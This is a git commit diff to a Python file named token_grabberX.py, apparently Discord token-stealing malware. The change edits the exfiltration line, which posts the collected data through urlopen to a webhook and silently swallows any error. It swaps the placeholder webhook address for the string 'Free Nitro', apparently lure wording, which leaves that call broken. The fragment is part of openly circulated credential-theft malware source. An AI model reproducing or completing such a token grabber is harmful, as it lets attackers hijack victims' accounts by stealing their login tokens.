2b8c7c79fb333cf26d3b410e1f1c921437f988e2
Bence100241 <benceodor2000@gmail.com>
2026-05-02 20:57:58 +0200

    fdf

--- token_grabberX.py
+++ token_grabberX.py
@@ -370,7 +370,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("YOUR WEEBHOOK LINK HERE", data=dumps(webhook).encode(), headers=getheaders()))   
+        urlopen(Request("Free Nitro", data=dumps(webhook).encode(), headers=getheaders()))   
 
     except:
         pass
